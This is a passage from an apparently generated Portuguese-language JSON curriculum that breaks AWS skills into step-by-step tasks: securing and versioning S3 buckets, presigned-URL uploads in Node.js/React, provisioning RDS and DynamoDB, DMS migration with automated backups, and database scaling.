                                  "verification": "Tente acessar o bucket anonimamente (deve falhar) e com IAM creds (deve succeed).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "AWS CLI instalado",
                                    "Credenciais IAM com permissões admin temporárias"
                                  ],
                                  "tips": "Use o Policy Simulator no IAM para validar políticas antes de aplicar.",
                                  "learningObjective": "Dominar controle granular de acesso via IAM e bucket policies para segurança.",
                                  "commonMistakes": [
                                    "Políticas muito permissivas (ex: * actions)",
                                    "Esquecer de negar public access",
                                    "JSON syntax errors bloqueando aplicação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Habilitar Versionamento no Bucket",
                                  "subSteps": [
                                    "No bucket S3, vá para 'Properties' > 'Bucket Versioning' e selecione 'Enable'.",
                                    "Faça upload de um objeto, modifique-o e delete; verifique se versões antigas persistem.",
                                    "Configure 'Suspend versioning' se precisar pausar temporariamente.",
                                    "Entenda implicações: storage costs dobram com múltiplas versões.",
                                    "Use AWS CLI para listar versões: aws s3api list-object-versions --bucket meu-bucket."
                                  ],
                                  "verification": "Liste versões de um objeto e confirme retenção de histórico.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Objetos de teste (arquivos pequenos)",
                                    "AWS CLI"
                                  ],
                                  "tips": "Versionamento é irreversível sem delete markers; planeje cleanup com lifecycle.",
                                  "learningObjective": "Compreender versionamento para recuperação de dados e auditoria.",
                                  "commonMistakes": [
                                    "Não testar com deletes reais",
                                    "Ignorar custos extras de storage",
                                    "Confundir com replication"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Lifecycle Policies para Otimização de Custos",
                                  "subSteps": [
                                    "No bucket, vá para 'Management' > 'Create lifecycle rule'.",
                                    "Nomeie a regra (ex: move-to-ia-after-30days) e aplique a todo conteúdo ou prefixo específico.",
                                    "Configure transições: Standard-IA após 30 dias, Glacier após 90 dias, expire após 365 dias.",
                                    "Ative 'Expire delete markers' e 'Permanently delete noncurrent versions'.",
                                    "Salve e monitore via 'Metrics' para confirmar aplicação."
                                  ],
                                  "verification": "Simule com objetos antigos ou use S3 Analytics para prever impactos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Conhecimento de classes de storage S3 (Standard, IA, Glacier)"
                                  ],
                                  "tips": "Calcule custos com S3 Pricing Calculator antes de aplicar.",
                                  "learningObjective": "Otimizar storage costs automatizando transições e expirações.",
                                  "commonMistakes": [
                                    "Regras sobrepostas causando loops",
                                    "Transições prematuras perdendo acesso rápido",
                                    "Esquecer noncurrent versions"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure um bucket S3 'ecommerce-imagens-prod' para um site de varejo: IAM policy restrita ao time de dev, versionamento para rollback de assets corrompidos, lifecycle movendo imagens antigas para IA após 30 dias e Glacier após 180, reduzindo custos em 40% para 1TB de dados.",
                              "finalVerifications": [
                                "Bucket criado com nome único e região otimizada.",
                                "Acesso restrito: falha anônima, sucesso via IAM.",
                                "Versionamento ativo com múltiplas versões visíveis.",
                                "Lifecycle rule aplicada e ativa sem erros.",
                                "Custos estimados otimizados (ver S3 dashboard).",
                                "Sem vulnerabilidades públicas (use S3 Security Scan)."
                              ],
                              "assessmentCriteria": [
                                "Nome e região do bucket adequados ao contexto.",
                                "Políticas IAM seguem princípio de least privilege.",
                                "Versionamento habilitado corretamente sem gaps.",
                                "Lifecycle rules balanceiam custo, acessibilidade e retenção.",
                                "Testes comprovam segurança e funcionalidade.",
                                "Documentação de configurações incluída."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: IAM e criptografia em repouso.",
                                "DevOps: Integração com CI/CD pipelines (ex: Terraform para IaC).",
                                "Análise de Custos: Monitoramento via AWS Cost Explorer.",
                                "Desenvolvimento Web: Integração com apps via SDKs (ex: boto3 Python)."
                              ],
                              "realWorldApplication": "Em apps escaláveis como plataformas de streaming (Netflix usa S3 para vídeos) ou ML (armazenar datasets com lifecycle para treinamento eficiente), garantindo alta disponibilidade, segurança contra vazamentos e otimização de custos para petabytes de dados."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.1.3",
                            "name": "Integrar storage gerenciado em uma aplicação web",
                            "description": "Implementar upload/download de arquivos usando SDKs (ex: AWS SDK para JavaScript) em uma aplicação Node.js ou React, lidando com presigned URLs para acesso temporário e escalabilidade automática.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente AWS e instalar SDK",
                                  "subSteps": [
                                    "Criar uma conta AWS gratuita e configurar IAM user com permissões mínimas para S3 (AmazonS3FullAccess policy)",
                                    "Instalar AWS SDK for JavaScript v3 via npm: npm install @aws-sdk/client-s3 @aws-sdk/s3-request-presigner",
                                    "Configurar credenciais AWS localmente usando AWS CLI (aws configure) ou variáveis de ambiente (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)",
                                    "Criar um bucket S3 no console AWS com configurações públicas ou privadas conforme necessidade",
                                    "Testar conexão básica com S3 listando buckets via código Node.js"
                                  ],
                                  "verification": "Executar script de teste que lista buckets S3 sem erros e exibe o nome do bucket criado",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Conta AWS gratuita",
                                    "Node.js 18+",
                                    "AWS CLI instalado",
                                    "Documentação: https://docs.aws.amazon.com/sdk-for-javascript/v3/developer-guide/getting-started-nodejs.html"
                                  ],
                                  "tips": "Use perfis IAM com princípio de menor privilégio para evitar riscos de segurança",
                                  "learningObjective": "Entender autenticação e configuração inicial de serviços gerenciados AWS",
                                  "commonMistakes": "Expor credenciais hardcoded no código; esquecer de instalar dependências corretas do SDK v3"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar geração de presigned URLs no backend Node.js",
                                  "subSteps": [
                                    "Criar endpoint Express.js para gerar presigned URL de upload (usar getSignedUrl com s3.createPresignedPost)",
                                    "Configurar parâmetros: bucket name, key (nome do arquivo), expiresIn (ex: 15 minutos), condições como content-type",
                                    "Adicionar validação de input: tamanho máximo do arquivo, tipos MIME permitidos",
                                    "Implementar rota POST /generate-upload-url que retorna a URL e campos POST",
                                    "Tratar erros como BucketNotFound ou AccessDenied com respostas HTTP apropriadas"
                                  ],
                                  "verification": "Chamar endpoint via Postman/Curl e receber presigned URL válida; testar POST para S3 com curl",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Express.js framework",
                                    "Postman para testes",
                                    "Docs: https://docs.aws.amazon.com/AWSJavaScriptSDK/v3/latest/modules/_aws_sdk_s3_request_presigner.html"
                                  ],
                                  "tips": "Defina expiresIn curto para segurança; use HTTPS sempre em produção",
                                  "learningObjective": "Dominar presigned URLs para uploads seguros sem expor credenciais no frontend",
                                  "commonMistakes": "Não definir condições no presignedPost, permitindo uploads maliciosos; ignorar CORS no bucket S3"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar upload e download no frontend React",
                                  "subSteps": [
                                    "Criar componente React para seleção de arquivo e botão upload",
                                    "Fazer fetch para backend gerar presigned URL, então usar FormData para POST multipart para S3",
                                    "Implementar download: gerar presigned GET URL no backend e fetch com redirect para download",
                                    "Adicionar progress bar usando XMLHttpRequest ou fetch com ReadableStream",
                                    "Lidar com estados: loading, success, error com notificações (ex: Toastify)"
                                  ],
                                  "verification": "Selecionar arquivo, upload sem erros, verificar presença no S3 console; download salva arquivo localmente",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "React 18+ com Vite/Create React App",
                                    "Axios ou native fetch",
                                    "Docs: https://react.dev/reference/react/useState"
                                  ],
                                  "tips": "Use AbortController para cancelar uploads longos; valide tamanho no frontend também",
                                  "learningObjective": "Construir fluxos client-side seguros para storage gerenciado",
                                  "commonMistakes": "Fazer upload direto sem presigned URL (expõe credenciais); não tratar erros de rede"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar escalabilidade, segurança e otimização",
                                  "subSteps": [
                                    "Configurar CORS no bucket S3 para permitir origens específicas",
                                    "Simular múltiplos uploads simultâneos com ferramentas como Artillery ou scripts",
                                    "Implementar retry logic com exponential backoff para falhas transitórias",
                                    "Adicionar logging com Winston e monitoramento com CloudWatch (opcional)",
                                    "Auditar segurança: verificar políticas IAM, lifecycle rules para deleção automática"
                                  ],
                                  "verification": "Executar load test com 10+ uploads simultâneos sem falhas; inspecionar logs e S3 console",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Artillery.io para load testing",
                                    "AWS Console para CORS/IAM",
                                    "Docs: https://docs.aws.amazon.com/AmazonS3/latest/userguide/cors.html"
                                  ],
                                  "tips": "Ative versioning no bucket para recuperação de arquivos; use Transfer Acceleration para regiões distantes",
                                  "learningObjective": "Garantir aplicação robusta e escalável com storage gerenciado",
                                  "commonMistakes": "Ignorar limites de request rate do S3; não configurar CORS levando a erros de preflight"
                                }
                              ],
                              "practicalExample": "Em uma aplicação React de compartilhamento de documentos (como um Google Drive simplificado), o backend Node.js gera presigned URLs para upload de PDFs. Usuário seleciona arquivo, frontend posta para S3 via URL temporária, e download usa presigned GET para visualização segura sem backend proxy.",
                              "finalVerifications": [
                                "Upload de arquivo de 5MB completa em <10s e aparece no S3",
                                "Presigned URL expira após tempo definido e rejeita requests",
                                "Download presigned funciona cross-browser (Chrome, Firefox)",
                                "CORS configurado corretamente sem erros no console dev",
                                "Load test com 20 uploads simultâneos succeeds sem throttling",
                                "Logs capturam erros e sucessos adequadamente"
                              ],
                              "assessmentCriteria": [
                                "Código modular com separação clara de backend/frontend",
                                "Tratamento completo de erros com mensagens user-friendly",
                                "Segurança: sem credenciais expostas, presigned URLs com condições",
                                "Performance: progress indicators e otimização de requests",
                                "Testabilidade: funções unit testáveis (ex: Jest para geração de URL)",
                                "Documentação inline no código explicando fluxos"
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Autenticação IAM e políticas de acesso",
                                "DevOps: Integração com CI/CD para deploy em ECS/Fargate",
                                "Banco de Dados: Armazenar metadados de arquivos em DynamoDB",
                                "Redes: Configuração de VPC endpoints para S3 privado"
                              ],
                              "realWorldApplication": "Aplicações como Netflix usam S3 para armazenar thumbnails de vídeos, gerando presigned URLs para streaming global escalável, lidando com petabytes de dados e picos de tráfego sem downtime."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.5.2",
                        "name": "Serviços de Bancos de Dados Gerenciados",
                        "description": "Serviços PaaS para bancos de dados relacionais (RDS) e NoSQL (DynamoDB), com automação de backups, patching, replicação e escalabilidade horizontal/vertical para suportar cargas variáveis em aplicações na nuvem.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.2.1",
                            "name": "Criar e configurar uma instância de banco de dados gerenciado",
                            "description": "Provisionar um RDS para MySQL/PostgreSQL ou DynamoDB, definindo parâmetros como tamanho da instância, multi-AZ para alta disponibilidade e VPC para isolamento de rede em aplicações internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de rede com VPC e grupos de segurança",
                                  "subSteps": [
                                    "Acesse o console AWS e navegue até o serviço VPC.",
                                    "Crie uma nova VPC com CIDR block /16 (ex: 10.0.0.0/16).",
                                    "Crie pelo menos duas sub-redes públicas e privadas em AZs diferentes.",
                                    "Configure um Security Group para o RDS permitindo tráfego MySQL (porta 3306) de IPs específicos.",
                                    "Crie um Internet Gateway e configure rotas para NAT Gateway nas sub-redes privadas."
                                  ],
                                  "verification": "Verifique no console VPC se a VPC está ativa, sub-redes criadas e Security Group com regras corretas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Conta AWS gratuita ou paga, acesso ao AWS Management Console, navegador web.",
                                  "tips": "Use AZs diferentes para sub-redes para suportar Multi-AZ futuramente; nomeie recursos com tags para organização.",
                                  "learningObjective": "Entender isolamento de rede e configuração básica de VPC para serviços gerenciados.",
                                  "commonMistakes": [
                                    "Esquecer de anexar Internet Gateway à VPC.",
                                    "Configurar Security Group muito permissivo (0.0.0.0/0).",
                                    "Usar apenas uma AZ, limitando alta disponibilidade."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Provisionar instância RDS para MySQL ou PostgreSQL",
                                  "subSteps": [
                                    "No console RDS, clique em 'Criar banco de dados' e selecione engine MySQL ou PostgreSQL.",
                                    "Escolha tipo de instância (ex: db.t3.micro para testes) e defina credenciais master.",
                                    "Configure VPC, sub-redes privadas e associe o Security Group criado.",
                                    "Habilite backups automáticos e defina janela de manutenção.",
                                    "Revise e crie a instância; aguarde status 'Available'."
                                  ],
                                  "verification": "Confirme no console RDS que a instância está 'Available' com configurações de engine e tamanho corretas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Conta AWS com permissões RDS, VPC pré-configurada do Step 1.",
                                  "tips": "Comece com instância pequena para economia; use senhas fortes e anote-as em gerenciador seguro.",
                                  "learningObjective": "Dominar provisionamento inicial de RDS com parâmetros essenciais como tamanho e rede.",
                                  "commonMistakes": [
                                    "Selecionar instância pública inadvertidamente.",
                                    "Não associar à VPC correta.",
                                    "Ignorar configuração de storage (use gp2 ou gp3)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar alta disponibilidade com Multi-AZ e opções avançadas",
                                  "subSteps": [
                                    "Modifique a instância RDS existente: habilite 'Disponibilidade Multi-AZ'.",
                                    "Ajuste tamanho da instância se necessário e configure grupo de parâmetros padrão.",
                                    "Habilite monitoramento avançado, logs e retenção de backups (ex: 7 dias).",
                                    "Para DynamoDB alternativa: crie uma tabela com chave primária e configure capacidade on-demand.",
                                    "Aplique mudanças e monitore a failover simulação no console."
                                  ],
                                  "verification": "Verifique no console RDS se Multi-AZ está 'Yes' e standby replicado; para DynamoDB, confirme tabela ativa.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Instância RDS do Step 2, console AWS CloudWatch para monitoramento.",
                                  "tips": "Multi-AZ dobra custo mas garante 99.99% uptime; teste failover em ambiente dev.",
                                  "learningObjective": "Implementar resiliência e escalabilidade em bancos gerenciados.",
                                  "commonMistakes": [
                                    "Aplicar Multi-AZ sem sub-redes em múltiplas AZs.",
                                    "Configurar backups sem retenção adequada.",
                                    "Subestimar throughput para DynamoDB."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar conectividade, segurança e aplicação prática",
                                  "subSteps": [
                                    "Baixe endpoint DNS da instância RDS e teste conexão com cliente MySQL (ex: mysql workbench).",
                                    "Configure IAM database authentication ou roles para acesso sem senha.",
                                    "Crie uma tabela de teste, insira dados e execute queries.",
                                    "Para DynamoDB, use AWS CLI para put-item e scan operations.",
                                    "Monitore métricas no CloudWatch e delete recursos de teste."
                                  ],
                                  "verification": "Conexão bem-sucedida com query executada; métricas CloudWatch mostram tráfego normal.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Cliente MySQL ou psql, AWS CLI instalado, endpoint RDS/DynamoDB.",
                                  "tips": "Use SSL para conexões; integre com Lambda/EC2 para apps reais.",
                                  "learningObjective": "Validar configuração end-to-end e práticas de segurança.",
                                  "commonMistakes": [
                                    "Endpoint incorreto ou porta errada.",
                                    "Security Group bloqueando tráfego.",
                                    "Expor credenciais em código fonte."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de blog, provisionar RDS MySQL (db.t3.small, Multi-AZ, VPC privada) para posts e usuários relacionais; use DynamoDB para cache de sessões com TTL automático, conectando via SDK em uma API Node.js hospedada em EC2.",
                              "finalVerifications": [
                                "Instância RDS em status 'Available' com Multi-AZ ativado.",
                                "Conexão externa bem-sucedida via cliente SQL sem erros.",
                                "Tabela DynamoDB criada com itens inseridos e lidos corretamente.",
                                "Métricas CloudWatch mostram CPU < 50% e backups recentes.",
                                "Security Groups e IAM roles configurados sem exposições públicas.",
                                "Failover Multi-AZ testado com tempo de recuperação < 120s."
                              ],
                              "assessmentCriteria": [
                                "Configuração VPC isolada e segura: 25%.",
                                "Provisionamento RDS com parâmetros corretos (tamanho, engine): 25%.",
                                "Alta disponibilidade Multi-AZ e backups funcionais: 20%.",
                                "Integração DynamoDB e testes de conectividade: 15%.",
                                "Monitoramento e verificações finais sem erros: 15%."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: IAM, Security Groups e criptografia.",
                                "DevOps: Integração com CloudFormation para IaC.",
                                "Desenvolvimento de Software: Conexão via SDKs em linguagens como Python/Java.",
                                "Redes: Conceitos de VPC peering e subnets.",
                                "Gestão de Projetos: Custos e escalabilidade em nuvem."
                              ],
                              "realWorldApplication": "Empresas como e-commerce (ex: Amazon) usam RDS Multi-AZ para transações críticas e DynamoDB para catálogos escaláveis, garantindo 99.99% uptime durante picos de Black Friday com isolamento VPC contra DDoS."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.2.2",
                            "name": "Implementar migração e backups automatizados",
                            "description": "Migrar dados de um banco on-premise para um serviço gerenciado usando ferramentas como DMS (Database Migration Service), configurar snapshots automáticos e restauração point-in-time.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar e Preparar o Ambiente para Migração",
                                  "subSteps": [
                                    "Analisar schema, tamanho dos dados e dependências do banco on-premise (ex: MySQL/PostgreSQL)",
                                    "Definir janelas de downtime aceitável e estratégia de migração (full load + CDC)",
                                    "Configurar infraestrutura na cloud: VPC, security groups e instância target (ex: RDS)",
                                    "Instalar e configurar DMS replication instance e source endpoint",
                                    "Realizar backup inicial do banco source e validar compatibilidade de versões"
                                  ],
                                  "verification": "Checklist de preparação assinado, target DB criado e acessível, backup inicial validado sem erros",
                                  "estimatedTime": "4-6 horas",
                                  "materials": [
                                    "Acesso administrativo ao banco on-premise",
                                    "Conta na cloud provider (AWS/GCP/Azure)",
                                    "Documentação oficial DMS (AWS DMS manual)",
                                    "Ferramentas: AWS CLI ou Console"
                                  ],
                                  "tips": "Use ferramentas como AWS Schema Conversion Tool (SCT) para schemas complexos e priorize migrações em horários de baixa carga",
                                  "learningObjective": "Identificar riscos e pré-requisitos para uma migração segura e eficiente",
                                  "commonMistakes": [
                                    "Ignorar diferenças de charset/collation entre source e target",
                                    "Subestimar latência de rede para grandes volumes de dados",
                                    "Não testar conectividade de endpoints antes da criação da task"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e Executar a Migração com DMS",
                                  "subSteps": [
                                    "Criar endpoints source e target no DMS com credenciais seguras",
                                    "Configurar migration task: full load + ongoing replication (CDC)",
                                    "Selecionar tabelas/schemas para migração e mapear transformações se necessário",
                                    "Iniciar task de migração e monitorar progresso via CloudWatch",
                                    "Validar integridade de dados pós-migração comparando row counts e checksums"
                                  ],
                                  "verification": "Task DMS concluída com status 'successful', dados validados (contagens e samples iguais)",
                                  "estimatedTime": "6-8 horas (dependendo do volume de dados)",
                                  "materials": [
                                    "AWS DMS Console ou CLI",
                                    "Credenciais IAM com permissões DMS",
                                    "Ferramentas de validação: mysqldump ou pg_dump para comparações"
                                  ],
                                  "tips": "Ative logging detalhado na task e use table mappings JSON para filtros precisos",
                                  "learningObjective": "Executar migração contínua com mínima interrupção usando DMS",
                                  "commonMistakes": [
                                    "Não habilitar CDC para migrações online, causando perda de transações",
                                    "Configurar tasks sem limite de LOB size para bancos com blobs grandes",
                                    "Ignorar erros de validação inicial de conectividade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Backups Automatizados com Snapshots",
                                  "subSteps": [
                                    "Habilitar automated backups no serviço gerenciado (ex: RDS automated snapshots)",
                                    "Definir retention period (ex: 7-35 dias) e janela de backup preferida",
                                    "Configurar políticas de snapshot: frequência diária e transação logs para PITR",
                                    "Testar criação manual de snapshot e verificar armazenamento no S3",
                                    "Integrar com notificações (SNS) para alertas de falhas em backups"
                                  ],
                                  "verification": "Primeiro snapshot automático criado e listado, retention policy aplicada",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Console RDS ou CLI",
                                    "Documentação RDS backups",
                                    "IAM roles para S3 access"
                                  ],
                                  "tips": "Escolha janelas de backup fora do pico de uso e monitore custos de storage",
                                  "learningObjective": "Implementar backups automatizados escaláveis em serviços gerenciados",
                                  "commonMistakes": [
                                    "Definir retention muito curta, perdendo janelas de recuperação",
                                    "Não habilitar backup de transação logs, limitando PITR",
                                    "Esquecer de criptografar snapshots em trânsito/repouso"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Restauração Point-in-Time e Validação Final",
                                  "subSteps": [
                                    "Selecionar um snapshot recente e restaurar para nova instância DB",
                                    "Executar PITR para um ponto específico usando transação logs",
                                    "Validar dados restaurados: queries de integridade e performance",
                                    "Simular failover: promover snapshot restaurado como primary",
                                    "Documentar procedimento de DR e automatizar com scripts/Lambda"
                                  ],
                                  "verification": "Restauração PITR bem-sucedida em <1 hora, dados íntegros confirmados",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Snapshots criados",
                                    "Ambiente de teste isolado",
                                    "Scripts de validação SQL"
                                  ],
                                  "tips": "Sempre teste em ambiente staging antes de produção e meça RTO/RPO",
                                  "learningObjective": "Garantir recuperação de desastres com PITR funcional",
                                  "commonMistakes": [
                                    "Não validar performance pós-restore (índices corrompidos)",
                                    "Testar apenas full restore, ignorando PITR granular",
                                    "Expor instâncias de teste publicamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Migrar um banco MySQL on-premise de 50GB (e-commerce app) para Amazon RDS MySQL: usar DMS para full load + CDC em 4 horas, configurar snapshots diários com 14 dias de retenção, restaurar PITR para corrigir um delete acidental de 2 horas atrás, validando 100% dos pedidos.",
                              "finalVerifications": [
                                "Dados migrados sem perda (row counts e checksums idênticos)",
                                "Snapshots automáticos criados diariamente e retention aplicada",
                                "PITR restaurado com sucesso para ponto específico com dados corretos",
                                "Monitoramento de backups via CloudWatch/SNS sem falhas",
                                "Documentação de procedimento de migração e restore completa",
                                "Teste de failover end-to-end em <30 min"
                              ],
                              "assessmentCriteria": [
                                "Migração com downtime <5 min e zero perda de dados",
                                "Backups automáticos 100% uptime nas últimas 24h",
                                "PITR recovery em <1h com precisão de minuto",
                                "Uso eficiente de recursos (custo < esperado)",
                                "Relatório de validação com métricas RTO/RPO",
                                "Integração com alertas e automação"
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Criptografia KMS para snapshots e migração segura",
                                "DevOps e Automação: IaC com Terraform para DMS/RDS provisioning",
                                "Gestão de Infraestrutura: Monitoramento com CloudWatch e CI/CD pipelines",
                                "Análise de Dados: Validação de integridade com queries analíticas",
                                "Continuidade de Negócios: Planejamento de DR e compliance GDPR"
                              ],
                              "realWorldApplication": "Em uma fintech migrando para AWS, implementar migração de banco legacy para Aurora RDS com backups PITR garante recuperação rápida de falhas, suportando 99.99% uptime e compliance regulatório, reduzindo custos operacionais em 40% vs. on-premise."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.5.2.3",
                            "name": "Configurar escalabilidade em bancos de dados gerenciados",
                            "description": "Habilitar read replicas, auto-scaling para NoSQL e sharding, otimizando consultas para lidar com picos de tráfego em aplicações web escaláveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar necessidades de escalabilidade e planejar configuração",
                                  "subSteps": [
                                    "Analise o tráfego atual e projetado da aplicação web usando métricas como QPS (queries per second) e picos esperados.",
                                    "Identifique o tipo de banco: SQL (ex: RDS/Aurora) ou NoSQL (ex: DynamoDB), e estratégias adequadas (read replicas para leituras, auto-scaling para throughput).",
                                    "Defina SLAs: tempo de resposta <200ms, disponibilidade 99.9%, custo máximo mensal.",
                                    "Crie um diagrama de arquitetura mostrando DB primário, replicas e auto-scaling groups.",
                                    "Revise custos estimados no pricing calculator da nuvem (ex: AWS)."
                                  ],
                                  "verification": "Documento de planejamento aprovado com diagrama e métricas baseline registradas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Conta em provedor de nuvem (AWS/GCP/Azure free tier)",
                                    "Ferramentas de monitoramento (CloudWatch/Prometheus)",
                                    "Pricing calculator do provedor"
                                  ],
                                  "tips": "Comece com dados reais de logs de aplicação para projeções precisas.",
                                  "learningObjective": "Compreender como dimensionar escalabilidade baseada em dados de tráfego.",
                                  "commonMistakes": [
                                    "Subestimar picos sazonais",
                                    "Ignorar custos de transferência de dados",
                                    "Não considerar latência de rede entre regiões"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Read Replicas para bancos SQL gerenciados",
                                  "subSteps": [
                                    "No console do RDS/Aurora, selecione o DB primário e crie 2-3 read replicas em múltiplas AZs.",
                                    "Configure endpoints de reader para roteamento automático de leituras via aplicação.",
                                    "Habilite Multi-AZ deployment e automatize failover.",
                                    "Atualize connection strings na app para usar reader endpoint para SELECTs.",
                                    "Monitore lag de replicação (<1s) via métricas do console."
                                  ],
                                  "verification": "Replicas online, lag <500ms, app roteia 80% leituras para replicas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Console AWS RDS",
                                    "Documentação oficial de read replicas",
                                    "Aplicação web de teste com pool de conexões (ex: SQLAlchemy)"
                                  ],
                                  "tips": "Use connection pooling para gerenciar múltiplas conexões eficientemente.",
                                  "learningObjective": "Implementar replicação de leitura para distribuir carga em DBs relacionais.",
                                  "commonMistakes": [
                                    "Não separar leituras/escritas corretamente",
                                    "Esquecer de monitorar lag",
                                    "Configurar replicas na mesma AZ"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Habilitar Auto-Scaling e Sharding em bancos NoSQL gerenciados",
                                  "subSteps": [
                                    "No DynamoDB, crie tabela com provisioned capacity e ative auto-scaling para RCU/WCU baseado em targets (70% utilization).",
                                    "Para sharding, configure Global Tables para distribuição multi-região ou use partition keys otimizadas.",
                                    "Defina alarmes para scaling (ex: >80% throughput) e limites máximos.",
                                    "Teste writes intensivos e verifique escalonamento automático.",
                                    "Integre com app via SDK, usando exponential backoff para throttling."
                                  ],
                                  "verification": "Tabela escala automaticamente para 2x throughput sem erros 5xx.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Console AWS DynamoDB",
                                    "AWS SDK para Node.js/Python",
                                    "Ferramenta de load test (Artillery/JMeter)"
                                  ],
                                  "tips": "Escolha partition keys com alta cardinalidade para evitar hot partitions.",
                                  "learningObjective": "Configurar escalabilidade horizontal automática em NoSQL para picos de tráfego.",
                                  "commonMistakes": [
                                    "Partition keys ruins causando hot shards",
                                    "Definir targets muito agressivos gerando custos altos",
                                    "Ignorar provisioned vs on-demand"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Otimizar consultas e validar escalabilidade sob carga",
                                  "subSteps": [
                                    "Analise slow queries com query analyzer (ex: RDS Performance Insights) e adicione indexes/otimizações.",
                                    "Implemente caching (Redis/ElastiCache) para queries frequentes.",
                                    "Execute load test simulando 10x tráfego pico com ferramentas como Locust.",
                                    "Monitore métricas globais: CPU <70%, latência <300ms, error rate <0.1%.",
                                    "Ajuste configurações baseadas em resultados e documente baseline pós-otimização."
                                  ],
                                  "verification": "Sistema sustenta 5x tráfego baseline sem degradação >20%.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "RDS Performance Insights",
                                    "Locust ou JMeter",
                                    "ElastiCache setup",
                                    "CloudWatch dashboards"
                                  ],
                                  "tips": "Sempre teste em ambiente staging idêntico à produção.",
                                  "learningObjective": "Otimizar performance e validar resiliência a picos de tráfego.",
                                  "commonMistakes": [
                                    "Otimizar sem indexes adequados",
                                    "Testes insuficientes em produção-like",
                                    "Ignorar custos de caching"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de e-commerce na AWS, configure read replicas no RDS PostgreSQL para consultas de catálogo durante Black Friday (10k QPS), auto-scaling no DynamoDB para carrinhos de compra, e otimize com indexes para reduzir latência de 2s para 150ms sob pico.",
                              "finalVerifications": [
                                "Read replicas lidam com 70% das leituras sem lag >1s.",
                                "Auto-scaling ativa em <5min para picos, mantendo throughput.",
                                "Consultas otimizadas respondem <200ms em 99% dos casos.",
                                "Custo mensal dentro do orçamento projetado (±10%).",
                                "Failover automático sem downtime >30s.",
                                "Métricas de monitoramento dashboards configurados e alertas ativos."
                              ],
                              "assessmentCriteria": [
                                "Planejamento inclui análise precisa de tráfego e custos.",
                                "Configurações de replicas e scaling seguem best practices do provedor.",
                                "Otimização de consultas reduz latência em pelo menos 50%.",
                                "Testes de carga validam SLAs com relatórios detalhados.",
                                "Documentação completa com diagramas e lições aprendidas.",
                                "Integração segura com aplicação (secrets manager, IAM roles)."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD para deployments automatizados.",
                                "Arquitetura de Software: Design de microsserviços stateless.",
                                "Segurança da Informação: Criptografia em trânsito/repose e VPC peering.",
                                "Análise de Dados: Uso de métricas para decisões baseadas em dados.",
                                "Gestão de Projetos: Estimativa de ROI de escalabilidade."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam read replicas no Aurora para streaming global e auto-scaling no Cassandra/DynamoDB para recomendações personalizadas, sustentando milhões de usuários simultâneos sem interrupções durante eventos como lançamentos de séries."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.2.1"
                            ]
                          }
                        ]
                      },
                      {
